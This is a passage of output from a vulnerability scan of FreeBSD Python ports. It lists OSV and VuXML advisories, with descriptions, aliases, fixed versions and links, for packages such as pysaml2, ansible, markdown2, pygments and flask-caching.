If you are building cryptography source ("sdist") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.


    Fixed in:  ['39.0.1']
    Link:      https://osv.dev/vulnerability/GHSA-x4qr-2fvf-3mr5
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.4.8 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-kerberos-1.3.1' / PIP's package 'kerberos-1.3.1' is vulnerable:
    Id:        PYSEC-2017-49
    Aliases:   ['CVE-2015-3206']
    Details:   The checkPassword function in python-kerberos does not authenticate the KDC it attempts to communicate with, which allows remote attackers to cause a denial of service (bad response), or have other unspecified impact by performing a man-in-the-middle attack.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2017-49
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.3.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-pysaml24-4.9.0_1' / PIP's package 'pysaml2-4.9.0' is vulnerable:
    Id:        PYSEC-2020-94
    Aliases:   ['CVE-2020-5390', 'GHSA-qf7v-8hj3-4xw7']
    Details:   PySAML2 before 5.0.0 does not check that the signature in a SAML document is enveloped and thus signature wrapping is effective, i.e., it is affected by XML Signature Wrapping (XSW). The signature information and the node/object that is signed can be in different places and thus the signature verification will succeed, but the wrong data will be used. This specifically affects the verification of assertion that have been signed.
    Fixed in:  ['5.0.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2020-94
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2021-48
    Aliases:   ['CVE-2021-21238', 'GHSA-f4g9-h89h-jgv9']
    Details:   PySAML2 is a pure python implementation of SAML Version 2 Standard. PySAML2 before 6.5.0 has an improper verification of cryptographic signature vulnerability. All users of pysaml2 that need to validate signed SAML documents are impacted. The vulnerability is a variant of XML Signature wrapping because it did not validate the SAML document against an XML schema. This allowed invalid XML documents to be processed and such a document can trick pysaml2 with a wrapped signature. This is fixed in PySAML2 6.5.0.
    Fixed in:  ['6.5.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-48
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2021-49
    Aliases:   ['CVE-2021-21239', 'GHSA-5p3x-r448-pc62']
    Details:   PySAML2 is a pure python implementation of SAML Version 2 Standard. PySAML2 before 6.5.0 has an improper verification of cryptographic signature vulnerability. Users of pysaml2 that use the default CryptoBackendXmlSec1 backend and need to verify signed SAML documents are impacted. PySAML2 does not ensure that a signed SAML document is correctly signed. The default CryptoBackendXmlSec1 backend is using the xmlsec1 binary to verify the signature of signed SAML documents, but by default xmlsec1 accepts any type of key found within the given document. xmlsec1 needs to be configured explicitly to only use only _x509 certificates_ for the verification process of the SAML document signature. This is fixed in PySAML2 6.5.0.
    Fixed in:  ['6.5.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-49
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-qf7v-8hj3-4xw7
    Aliases:   ['CVE-2020-5390']
    Details:   PySAML2 before 5.0.0 does not check that the signature in a SAML document is enveloped and thus signature wrapping is effective, i.e., it is affected by XML Signature Wrapping (XSW). The signature information and the node/object that is signed can be in different places and thus the signature verification will succeed, but the wrong data will be used. This specifically affects the verification of assertion that have been signed.
    Fixed in:  ['5.0.0']
    Link:      https://osv.dev/vulnerability/GHSA-qf7v-8hj3-4xw7
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-f4g9-h89h-jgv9
    Aliases:   ['CVE-2021-21238']
    Details:   ### Impact

All users of pysaml2 that use the default `CryptoBackendXmlSec1` backend and need to verify signed SAML documents are impacted. `pysaml2 <= 6.4.1` does not validate the SAML document against an XML schema. This allows invalid XML documents to trick the verification process, by presenting elements with a valid signature inside elements whose content has been malformed. The verification is offloaded to `xmlsec1` and `xmlsec1` will not validate every signature in the given document, but only the first it finds in the given scope.

### Patches

Users should upgrade to pysaml2 `v6.5.0`.

### Workarounds

No workaround provided at this point.

### References

No references provided at this point.

### Credits

- Victor Schönfelder Garcia (isits AG International School of IT Security)
- Juraj Somorovsky (Paderborn University)
- Vladislav Mladenov (Ruhr University Bochum)

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [pysaml2](https://github.com/IdentityPython/pysaml2)
* Email us at [the incident-response address](mailto:incident-response@idpy.org)
    Fixed in:  ['6.5.0']
    Link:      https://osv.dev/vulnerability/GHSA-f4g9-h89h-jgv9
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-5p3x-r448-pc62
    Aliases:   ['CVE-2021-21239']
    Details:   ### Impact

All users of pysaml2 that use the default `CryptoBackendXmlSec1` backend and need to verify signed SAML documents are impacted. `pysaml2 <= 6.4.1` does not ensure that a signed SAML document is correctly signed. The default `CryptoBackendXmlSec1` backend is using the `xmlsec1` binary to verify the signature of signed SAML documents, but by default, `xmlsec1` accepts any type of key found within the given document. `xmlsec1` needs to be configured explicitly to only use only _x509 certificates_ for the verification process of the SAML document signature.

### Patches

Users should upgrade to pysaml2 `v6.5.0`.

### Workarounds

No workaround provided at this point.

### References

This issue has been reported in the past at the xmlsec1 mailing list:
https://www.aleksey.com/pipermail/xmlsec/2013/009717.html

### Credits

- Brian Wolff

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [pysaml2](https://github.com/IdentityPython/pysaml2)
* Email us at [the incident-response address](mailto:incident-response@idpy.org)

    Fixed in:  ['6.5.0']
    Link:      https://osv.dev/vulnerability/GHSA-5p3x-r448-pc62
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 4.9.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-tuf-2.1.0' / PIP's package 'tuf-2.1.0' is vulnerable:
    Id:        GHSA-2828-9vh6-9m6j
    Aliases:   ['CVE-2020-6173']
    Details:   ### Impact
An attacker who can gain file access to the repository and modify metadata files may cause a denial of service to clients by creating many invalid signatures on a metadata file. Having a large number of signatures to verify will delay the moment when the client will determine the signature is not valid. This delay may be for at least a few minutes, but possibly could be longer especially if multiple files are impacted.

The tuf maintainers would like to thank Erik MacLean of Analog Devices, Inc. for reporting this issue.

### Patches
No fix exists for this issue. 

### Workarounds
No workarounds are known for this issue.

### References
* [CVE-2020-6173](https://nvd.nist.gov/vuln/detail/CVE-2020-6173)
* [Issue #973](https://github.com/theupdateframework/tuf/issues/973)
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-2828-9vh6-9m6j
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.1.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-ansible-7.1.0' / PIP's package 'ansible-7.1.0' is vulnerable:
    Id:        PYSEC-2020-221
    Aliases:   ['CVE-2020-25636']
    Details:   A flaw was found in Ansible Base when using the aws_ssm connection plugin as there is no namespace separation for file transfers. Files are written directly to the root bucket, making possible to have collisions when running multiple ansible processes. This issue affects mainly the service availability.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2020-221
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2020-220
    Aliases:   ['CVE-2020-25635']
    Details:   A flaw was found in Ansible Base when using the aws_ssm connection plugin as garbage collector is not happening after playbook run is completed. Files would remain in the bucket exposing the data. This issue affects directly data confidentiality.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2020-220
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2021-125
    Aliases:   ['CVE-2021-3532']
    Details:   A flaw was found in Ansible where the secret information present in async_files are getting disclosed when the user changes the jobdir to a world readable directory. Any secret information in an async status file will be readable by a malicious user on that system. This flaw affects Ansible Tower 3.7 and Ansible Automation Platform 1.2.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2021-125
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-f85h-23mf-2fwh
    Aliases:   ['CVE-2020-1738']
    Details:   A flaw was found in Ansible Engine when the module package or service is used and the parameter 'use' is not specified. If a previous task is executed with a malicious user, the module sent can be selected by the attacker using the ansible facts file. All versions in 2.7.x, 2.8.x and 2.9.x branches are believed to be vulnerable.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-f85h-23mf-2fwh
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-x7jh-595q-wq82
    Aliases:   ['CVE-2020-1736']
    Details:   A flaw was found in Ansible Engine when a file is moved using atomic_move primitive as the file mode cannot be specified. This sets the destination files world-readable if the destination file does not exist and if the file exists, the file could be changed to have less restrictive permissions before the move. This could lead to the disclosure of sensitive data. All versions in 2.7.x, 2.8.x and 2.9.x branches are believed to be vulnerable.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-x7jh-595q-wq82
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-vp9j-rghq-8jhh
    Aliases:   ['CVE-2020-10744']
    Details:   An incomplete fix was found for the fix of the flaw CVE-2020-1733 ansible insecure temporary directory when running become_user from become directive. The provided fix is insufficient to prevent the race condition on systems using ACLs and FUSE filesystems. Ansible Engine 2.7.18, 2.8.12, and 2.9.9 as well as previous versions are affected and Ansible Tower 3.4.5, 3.5.6 and 3.6.4 as well as previous versions are affected.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-vp9j-rghq-8jhh
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 7.1.0 >>>>>>>>>>>>>>>>>>>>>>>>
WARNING:root:Version number '1.9.6_1' handled as '1.9.6'
WARNING:root:Version number '2.2.0.0_2' handled as '2.2.0.0'
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
Vulnerability ID: ae2e7871-80f6-11ea-bafd-815569f3852d
  Topic: ansible - Vault password leak from temporary file
  Affects:
    ansible:
      < 2.8.9 ; 
    ansible27:
      < 2.7.17 ; 
    ansible26:
      < 2.7.17 ; 
    ansible25:
      < 2.7.17 ; 
    ansible24:
      < 2.7.17 ; 
    ansible23:
      < 2.7.17 ; 
  References:
    url: https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-1740
    url: https://github.com/ansible/ansible/issues/67798
    cvename: CVE-2020-1740
  Discovery date: 2020-02-12
  Entry date: 2020-04-17

Vulnerability ID: 67dbeeb6-80f4-11ea-bafd-815569f3852d
  Topic: ansible - subversion password leak from PID
  Affects:
    ansible:
      < 2.8.9 ; 
    ansible27:
      < 2.7.17 ; 
    ansible26:
      < 2.7.17 ; 
    ansible25:
      < 2.7.17 ; 
    ansible24:
      < 2.7.17 ; 
    ansible23:
      < 2.7.17 ; 
  References:
    url: https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-1739
    url: https://github.com/ansible/ansible/issues/67797
    url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FWDK3QUVBULS3Q3PQTGEKUQYPSNOU5M3/
    url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QT27K5ZRGDPCH7GT3DRI3LO4IVDVQUB7/
    url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U3IMV3XEIUXL6S4KPLYYM4TVJQ2VNEP2/
    cvename: CVE-2020-1739
  Discovery date: 2020-02-12
  Entry date: 2020-04-17

Vulnerability ID: 0899c0d3-80f2-11ea-bafd-815569f3852d
  Topic: ansible - win_unzip path normalization
  Affects:
    ansible:
      < 2.8.9 ; 
    ansible27:
      < 2.7.17 ; 
    ansible26:
      < 2.7.17 ; 
    ansible25:
      < 2.7.17 ; 
    ansible24:
      < 2.7.17 ; 
    ansible23:
      < 2.7.17 ; 
  References:
    url: https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-1737
    url: https://github.com/ansible/ansible/issues/67795
    url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FWDK3QUVBULS3Q3PQTGEKUQYPSNOU5M3/
    url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QT27K5ZRGDPCH7GT3DRI3LO4IVDVQUB7/
    url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U3IMV3XEIUXL6S4KPLYYM4TVJQ2VNEP2/
    cvename: CVE-2020-1737
  Discovery date: 2020-02-12
  Entry date: 2020-04-17

Vulnerability ID: 478d4102-2319-4026-b3b2-a57c48f159ac
  Topic: ansible -- information disclosure flaw
  Affects:
    ansible:
      <= 2.2.3 ; 
  References:
    url: https://github.com/ansible/ansible/issues/22505
    cvename: CVE-2017-7473
  Discovery date: 2017-07-21
  Entry date: 2017-09-25

Vulnerability ID: 15a04b9f-47cb-11e7-a853-001fbc0f280f
  Topic: ansible -- Input validation flaw in jinja2 templating system
  Affects:
    ansible:
      < 2.3.1 ; 
  References:
    url: https://access.redhat.com/security/cve/cve-2017-7481
    url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7481
  Discovery date: 2017-05-09
  Entry date: 2017-06-02

Vulnerability ID: a93c3287-d8fd-11e6-be5c-001fbc0f280f
  Topic: Ansible -- Command execution on Ansible controller from host
  Affects:
    ansible:
      > 1.9.6_1 ; < 2.2.0.0_2 ; 
  References:
    cvename: CVE-2016-9587
    url: https://www.computest.nl/advisories/CT-2017-0109_Ansible.txt
    url: https://lwn.net/Articles/711357/
  Discovery date: 2017-01-09
  Entry date: 2017-01-12

Vulnerability ID: 253c6889-06f0-11e6-925f-6805ca0b3d42
  Topic: ansible -- use of predictable paths in lxc_container
  Affects:
    ansible:
      >= 2.0.0.0 ; < 2.0.2.0 ; 
    ansible1:
      < 1.9.6 ; 
  References:
    cvename: CVE-2016-3096
    url: https://github.com/ansible/ansible-modules-extras/pull/1941/commits/8c6fe646ee79f5e55361b885b7efed5bec72d4a4
    url: https://bugzilla.redhat.com/show_bug.cgi?id=1322925
  Discovery date: 2016-04-02
  Entry date: 2016-04-20

Vulnerability ID: 72fccfdf-2061-11e5-a4a5-002590263bf5
  Topic: ansible -- multiple vulnerabilities
  Affects:
    ansible:
      < 1.9.2 ; 
  References:
    cvename: CVE-2015-3908
    cvename: CVE-2015-6240
    url: http://www.ansible.com/security
    url: https://raw.githubusercontent.com/ansible/ansible/v1.9.2-1/CHANGELOG.md
  Discovery date: 2015-06-25
  Entry date: 2015-07-02
  Modified date: 2015-08-18

Vulnerability ID: e308c61a-2060-11e5-a4a5-002590263bf5
  Topic: ansible -- multiple vulnerabilities
  Affects:
    ansible:
      < 1.7 ; 
  References:
    url: http://www.ansible.com/security
    url: https://raw.githubusercontent.com/ansible/ansible/devel/CHANGELOG.md
  Discovery date: 2014-08-06
  Entry date: 2015-07-02

Vulnerability ID: 9dae9d62-205f-11e5-a4a5-002590263bf5
  Topic: ansible -- code execution from compromised remote host data or untrusted local data
  Affects:
    ansible:
      < 1.6.7 ; 
  References:
    cvename: CVE-2014-4966
    bid: 68794
    url: http://www.ansible.com/security
    url: https://raw.githubusercontent.com/ansible/ansible/devel/CHANGELOG.md
  Discovery date: 2014-07-21
  Entry date: 2015-07-02

Vulnerability ID: 2c493ac8-205e-11e5-a4a5-002590263bf5
  Topic: ansible -- remote code execution vulnerability
  Affects:
    ansible:
      < 1.6.4 ; 
  References:
    cvename: CVE-2014-4678
    bid: 68335
    url: http://www.ansible.com/security
    url: https://raw.githubusercontent.com/ansible/ansible/devel/CHANGELOG.md
  Discovery date: 2014-06-25
  Entry date: 2015-07-02

Vulnerability ID: a6a9f9d5-205c-11e5-a4a5-002590263bf5
  Topic: ansible -- local symlink exploits
  Affects:
    ansible:
      < 1.2.3 ; 
  References:
    cvename: CVE-2013-4259
    cvename: CVE-2013-4260
    url: http://www.ansible.com/security
    url: https://groups.google.com/forum/#!topic/ansible-project/UVDYW0HGcNg
  Discovery date: 2013-08-21
  Entry date: 2015-07-02

Vulnerability ID: a478421e-2059-11e5-a4a5-002590263bf5
  Topic: ansible -- enable host key checking in paramiko connection type
  Affects:
    ansible:
      < 1.2.1 ; 
  References:
    cvename: CVE-2013-2233
    url: https://raw.githubusercontent.com/ansible/ansible/devel/CHANGELOG.md
    url: http://www.ansible.com/security
    url: https://github.com/ansible/ansible/issues/857
  Discovery date: 2012-08-13
  Entry date: 2015-07-02

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-psutil121-1.2.1_2' / PIP's package 'psutil-1.2.1' is vulnerable:
    Id:        PYSEC-2019-41
    Aliases:   ['CVE-2019-18874', 'GHSA-qfc5-mcwq-26q8']
    Details:   psutil (aka python-psutil) through 5.6.5 can have a double free. This occurs because of refcount mishandling within a while or for loop that converts system data into a Python object.
    Fixed in:  ['5.6.6']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-41
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-qfc5-mcwq-26q8
    Aliases:   ['CVE-2019-18874']
    Details:   psutil (aka python-psutil) through 5.6.5 can have a double free. This occurs because of refcount mishandling within a while or for loop that converts system data into a Python object.
    Fixed in:  ['5.6.6']
    Link:      https://osv.dev/vulnerability/GHSA-qfc5-mcwq-26q8
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.2.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-dparse-0.5.1' / PIP's package 'dparse-0.5.1' is vulnerable:
    Id:        GHSA-8fg9-p83m-x5pq
    Aliases:   ['CVE-2022-39280']
    Details:   ### Impact
dparse versions prior to 0.5.1 contain a regular expression that is vulnerable to [ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) (Regular Expression Denial of Service).

All users parsing index server URLs with dparse are impacted by this vulnerability.

### Patches
The Patch is applied in the `0.5.2` version, all users are recommended to upgrade as soon as possible.

### Workarounds
Avoid passing index server URLs in the source file to be parsed.

### References
[https://github.com/pyupio/dparse/tree/security/remove-intensive-regex](https://github.com/pyupio/dparse/tree/security/remove-intensive-regex)

### For more information
If you have any questions or comments about this advisory:
* Email us at [support@pyup.io](mailto:support@pyup.io)

    Fixed in:  ['0.5.2']
    Link:      https://osv.dev/vulnerability/GHSA-8fg9-p83m-x5pq
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2022-301
    Aliases:   ['CVE-2022-39280', 'GHSA-8fg9-p83m-x5pq']
    Details:   dparse is a parser for Python dependency files. dparse in versions before 0.5.2 contain a regular expression that is vulnerable to a Regular Expression Denial of Service. All the users parsing index server URLs with dparse are impacted by this vulnerability. A patch has been applied in version `0.5.2`, all the users are advised to upgrade to `0.5.2` as soon as possible. Users unable to upgrade should avoid passing index server URLs in the source file to be parsed.
    Fixed in:  ['0.5.2']
    Link:      https://osv.dev/vulnerability/PYSEC-2022-301
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 0.5.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-markdown-it-py-2.1.0_1' / PIP's package 'markdown-it-py-2.1.0' is vulnerable:
    Id:        GHSA-jrwr-5x3p-hvc3
    Aliases:   ['CVE-2023-26302']
    Details:   Denial of service could be caused to the command line interface of markdown-it-py, before v2.2.0, if an attacker was allowed to use invalid UTF-8 characters as input.
    Fixed in:  ['2.2.0']
    Link:      https://osv.dev/vulnerability/GHSA-jrwr-5x3p-hvc3
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-vrjv-mxr7-vjf8
    Aliases:   ['CVE-2023-26303']
    Details:   Denial of service could be caused to markdown-it-py, before v2.2.0, if an attacker was allowed to force null assertions with specially crafted input.
    Fixed in:  ['2.2.0']
    Link:      https://osv.dev/vulnerability/GHSA-vrjv-mxr7-vjf8
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.1.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-markdown2-2.3.6' / PIP's package 'markdown2-2.3.6' is vulnerable:
    Id:        PYSEC-2021-20
    Aliases:   ['CVE-2021-26813', 'GHSA-jr9p-r423-9m2r']
    Details:   markdown2 >=1.0.1.18, fixed in 2.4.0, is affected by a regular expression denial of service vulnerability. If an attacker provides a malicious string, it can make markdown2 processing difficult or delayed for an extended period of time.
    Fixed in:  ['2.4.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-20
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2020-65
    Aliases:   ['CVE-2020-11888', 'GHSA-fv3h-8x5j-pvgq']
    Details:   python-markdown2 through 2.3.8 allows XSS because element names are mishandled unless a \w+ match succeeds. For example, an attack might use elementname@ or elementname- with an onclick attribute.
    Fixed in:  ['2.3.9']
    Link:      https://osv.dev/vulnerability/PYSEC-2020-65
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-fv3h-8x5j-pvgq
    Aliases:   ['CVE-2020-11888']
    Details:   python-markdown2 through 2.3.8 allows XSS because element names are mishandled unless a \w+ match succeeds. For example, an attack might use elementname@ or elementname- with an onclick attribute.
    Fixed in:  ['2.3.9']
    Link:      https://osv.dev/vulnerability/GHSA-fv3h-8x5j-pvgq
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-jr9p-r423-9m2r
    Aliases:   ['CVE-2021-26813']
    Details:   markdown2 >=1.0.1.18, fixed in 2.4.0, is affected by a regular expression denial of service vulnerability. If an attacker provides a malicious string, it can make markdown2 processing difficult or delayed for an extended period of time.
    Fixed in:  ['2.4.0']
    Link:      https://osv.dev/vulnerability/GHSA-jr9p-r423-9m2r
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.3.6 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-pygments-25-2.5.2' / PIP's package 'pygments-2.5.2' is vulnerable:
    Id:        PYSEC-2021-140
    Aliases:   ['CVE-2021-20270', 'GHSA-9w8r-397f-prfh']
    Details:   An infinite loop in SMLLexer in Pygments versions 1.5 to 2.7.3 may lead to denial of service when performing syntax highlighting of a Standard ML (SML) source file, as demonstrated by input that only contains the "exception" keyword.
    Fixed in:  ['2.7.4']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-140
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2021-141
    Aliases:   ['CVE-2021-27291', 'GHSA-pq64-v7f5-gqh8']
    Details:   In pygments 1.1+, fixed in 2.7.4, the lexers used to parse programming languages rely heavily on regular expressions. Some of the regular expressions have exponential or cubic worst-case complexity and are vulnerable to ReDoS. By crafting malicious input, an attacker can cause a denial of service.
    Fixed in:  ['2.7.4']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-141
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-pq64-v7f5-gqh8
    Aliases:   ['CVE-2021-27291']
    Details:   In pygments 1.1+, fixed in 2.7.4, the lexers used to parse programming languages rely heavily on regular expressions. Some of the regular expressions have exponential or cubic worst-case complexity and are vulnerable to ReDoS. By crafting malicious input, an attacker can cause a denial of service.
    Fixed in:  ['2.7.4']
    Link:      https://osv.dev/vulnerability/GHSA-pq64-v7f5-gqh8
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-9w8r-397f-prfh
    Aliases:   ['CVE-2021-20270']
    Details:   An infinite loop in SMLLexer in Pygments versions 1.5 to 2.7.3 may lead to denial of service when performing syntax highlighting of a Standard ML (SML) source file, as demonstrated by input that only contains the "exception" keyword.
    Fixed in:  ['2.7.4']
    Link:      https://osv.dev/vulnerability/GHSA-9w8r-397f-prfh
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.5.2 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-beaker-1.12.1' / PIP's package 'beaker-1.12.1' is vulnerable:
    Id:        PYSEC-2020-216
    Aliases:   ['CVE-2013-7489', 'GHSA-3cwm-7jmm-774w']
    Details:   The Beaker library through 1.11.0 for Python is affected by deserialization of untrusted data, which could lead to arbitrary code execution.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2020-216
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.12.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-django-photologue-3.15_1' / PIP's package 'django-photologue-3.15' is vulnerable:
    Id:        GHSA-287q-jfcp-9vhv
    Aliases:   ['CVE-2022-4526']
    Details:   A vulnerability was found in django-photologue up to 3.15.1 and classified as problematic. Affected by this issue is some unknown functionality of the file photologue/templates/photologue/photo_detail.html of the component Default Template Handler. The manipulation of the argument object.caption leads to cross site scripting. The attack may be launched remotely. Upgrading to version 3.16 is able to address this issue. The name of the patch is 960cb060ce5e2964e6d716ff787c72fc18a371e7. It is recommended to apply a patch to fix this issue. VDB-215906 is the identifier assigned to this vulnerability.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-287q-jfcp-9vhv
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.15 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-flask-caching-1.9.0' / PIP's package 'flask-caching-1.9.0' is vulnerable:
    Id:        PYSEC-2021-13
    Aliases:   ['CVE-2021-33026', 'GHSA-656c-6cxf-hvcv']
    Details:   The Flask-Caching extension through 1.10.1 for Flask relies on Pickle for serialization, which may lead to remote code execution or local privilege escalation. If an attacker gains access to cache storage (e.g., filesystem, Memcached, Redis, etc.), they can construct a crafted payload, poison the cache, and execute Python code.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2021-13
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-656c-6cxf-hvcv
    Aliases:   ['CVE-2021-33026']
    Details:   Flask-Cache adds easy cache support to Flask. The Flask-Caching extension through 1.10.1 for Flask relies on Pickle for serialization, which may lead to remote code execution or local privilege escalation. If an attacker gains access to cache storage (e.g., filesystem, Memcached, Redis, etc.), they can construct a crafted payload, poison the cache, and execute Python code.

However, this is not a high-severity issue, as for an attack like this to work, an attacker must:

1. Be able to write arbitrary values to the cache
2. Be able to generate a cache key that will collide with a value being read by the application
3. Cause the application to read a maliciously-injected value

Any situation where all 3 of those is true is a situation where the application has larger problems; for example, if someone's able to inject malicious cached rendered pages into a Flask app's cache, then they can make the website say literally anything they want, regardless of whether it involves the execution of remote code. Basically, the Pickle vulnerability follows from a website already being extremely vulnerable (due to conditions 1 and 2 being met).
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-656c-6cxf-hvcv
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
